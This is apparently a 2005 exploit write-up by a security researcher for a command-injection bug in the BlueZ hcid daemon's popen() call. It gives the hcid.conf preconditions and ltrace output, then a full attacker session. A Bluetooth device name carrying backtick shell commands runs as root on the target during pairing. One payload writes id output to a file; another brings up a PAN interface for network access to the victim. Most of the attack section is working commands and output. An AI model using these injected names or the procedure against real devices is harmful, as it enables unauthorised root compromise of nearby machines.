@@ -1,0 +1,132 @@
+kf_lists[at]digitalmunition[dot]com
+
+After the release of TheftOfLinkKey.txt I had several people mention that they did not quite 
+understand why I consider the recently reported bluez vulnerability to be quite trivial. In this document
+I will attempt to outline an exploitable scenario for hcid using the popen() bug in security.c in order to help 
+support my view.
+
+http://cvs.sourceforge.net/viewcvs.py/bluez/utils/hcid/security.c?r1=1.34&r2=1.31
+http://cvs.sourceforge.net/viewcvs.py/bluez/utils/hcid/security.c?r1=1.36&r2=1.34
+
+Although I did not report this bug "first" I am going to explain how things work since alot of folks asked about it. 
+
+In order for this to be exploitable the target must have its security manager set to "user" in 
+/etc/bluetooth/hcid.conf. It must also have a PIN helper defined. Installing things like KDE 
+Bluetooth may influenced the targets settings. 
+
+# Security Manager mode
+#   none - Security manager disabled
+#   auto - Use local PIN for incoming connections
+#   user - Always ask user for a PIN
+#
+    security user;
+
+# PIN helper
+    pin_helper /usr/bin/bluez-pin;
+
+Obviously hcid must also be started and working and the target MUST have a bluetooth dongle. 
+
+threat:~# ps -ef |  grep hcid  | grep -v grep
+root      4426     1  0 23:54 ?        00:00:00 hcid: processing events
+
+The next requirement for exploitation is that the attacking devices name must be cached in /var/lib/bluetooth. Using 
+hcitool with the scan option is an easy way to demonstrate how a device name gets cached. As I mentioned above 
+installing things like KDE bluetooth may influence the configuration. Some user options cause periodic bluetooth 
+scans that may populate the name cache. 
+
+threat:~# hcitool scan
+Scanning ...
+        00:04:3E:65:A1:C8       '`/usr/bin/id>/tmp/pwned`'
+
+In ltrace when the attacking host attempts to pair with the target we can see the cache file being opened and its 
+contents later being used in a popen() call.  
+
+[0x804c72b] open("/var/lib/bluetooth/00:20:E0:4C:CF:DF/names", 66, 0644)                              = 7
+...
+[0x804c9c0] write(7, "00:04:3E:65:A1:C8 '`/usr/bin/id>/tmp/pwned`'\n", 43)                              = 43
+...
+[0x804b771] fork()                                                                                    = 4462
+[pid 4426] [0x804bc88] free(0x8056558)                                                                = <void>
+[pid 4426] [0x8050085] poll(0x805b410, 3, -1, 1, 0x804a880 <unfinished ...>
+[pid 4462] [0x804b8df] fgets( <unfinished ...>
+[pid 4462] [0x4013c8de] --- SIGCHLD (Child exited) ---
+[pid 4462] [0x804b8df] <... fgets resumed> "ERR\n", 255, 0x805d5c8)                                   = 0xbffff6a0
+[pid 4462] [0x804b8ed] pclose(0x805d5c8)                                                              = 0
+[pid 4462] [0x804b907] strlen("ERR\n")                                                                = 4
+[pid 4462] [0x804b95b] hci_send_cmd(6, 1, 14, 6, 0x8056562)                                           = 0
+[pid 4462] [0x804b967] exit(0 <unfinished ...>
+[pid 4462] [0xffffffff] +++ exited (status 0) +++
+
+Depending on which PIN helper the target is using it may see something like "Incoming connection from <BD_ADDR>".
+
+At this point regardless of refusal to pair or incorrect passwords the attacker has already delivered his 
+payload. 
+
+threat:/etc/bluetooth# ls -al /tmp/pwned
+-rw-r--r--  1 root root 39 2005-08-17 00:10 /tmp/pwned
+threat:/etc/bluetooth# cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)
+
+In order to shed a bit more light on the subject I will outline the attack from the attackers prospective. 
+
+First we profile the target. 
+kfinisterre@animosity:~$ btclt discovery
+Searching 8 sec ...
+Searching done. Resolving names ...
+done.
++1: Address: 00:20:e0:4c:cf:df, Class: 0x3E0100, Key: "no", Name: "threat"
+    Computer (Unclassified) [Networking,Rendering,Capturing,Object Transfer,Audio]
+
+Next set a malformed bluetooth name to aid in taking over the host. 
+kfinisterre@animosity:~$ btctl name
+Name: '`/usr/bin/pand --listen --master --role=NAP; while true; do /sbin/ifconfig bnep0 192.168.2.69 up; sleep 5 ; done`'
+
+Initiate the attack. 
+kfinisterre@animosity:~$ btctl addpin 00:20:e0:4c:cf:df 1111
+kfinisterre@animosity:~$ btctl pair 00:11:B1:07:BE:A7
+HCI error: LMP response timeout (34)
+
+At this point on the target we have run a few commands as root and we are waiting for a PAN connection. 
+root      3618  3110  0 21:12 ?        00:00:00 hcid: processing events
+root      3619  3618  0 21:12 ?        00:00:00 sh -c /usr/bin/bluez-pin in 00:04:3E:65:A1:C8 ''`/usr/bin/pand --listen --masterroot      3620  3619  0 21:12 ?        00:00:00 sh -c /usr/bin/bluez-pin in 00:04:3E:65:A1:C8 ''`/usr/bin/pand --listen --masterroot      3622     1  0 21:12 ?        00:00:00 /usr/bin/pand --listen --master --role=NAP
+root      3711     1  0 21:13 ?        00:00:00 [kbnepd bnep0]
+root      3728  3620  0 21:13 ?        00:00:00 sleep 5
+root      3729  3406  0 21:13 pts/1    00:00:00 ps -ef
+
+On the attacking machine close any open connections and then make a PAN connection to the target so that bnep0 
+will form. 
+kfinisterre@animosity:~$ btpan stop
+kfinisterre@animosity:~$ btpan init panu
+kfinisterre@animosity:~$ btpan connect 00:11:b1:07:be:a7
+Connecting to host 00:11:b1:07:be:a7 ...
+Service found
+connected.
+
+Wait a moment for the address to set on the target, and then configure your own machine to join the PAN. 
+
+On the target the address should take after a few seconds. 
+threat:~# ifconfig
+bnep0     Link encap:Ethernet  HWaddr 00:11:B1:07:BE:A7
+          inet addr:192.168.2.69  Bcast:192.168.2.255  Mask:255.255.255.0
+          inet6 addr: fe80::211:b1ff:fe07:bea7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:24 (24.0 b)  TX bytes:240 (240.0 b)
+
+Once our machine is configured we should have an IP connection to the target over bluetooth. 
+
+animosity:/home/kfinisterre# ifconfig pan0 192.168.2.11
+animosity:/home/kfinisterre# ping 192.168.2.69
+PING 192.168.2.69 (192.168.2.69) 56(84) bytes of data.
+64 bytes from 192.168.2.69: icmp_seq=1 ttl=64 time=52.2 ms
+64 bytes from 192.168.2.69: icmp_seq=2 ttl=64 time=41.9 ms
+
+Obviously at this point your imagination should have kicked in and I will leave the rest as an exercise for 
+the reader... 
+
+-KF
+
+
+
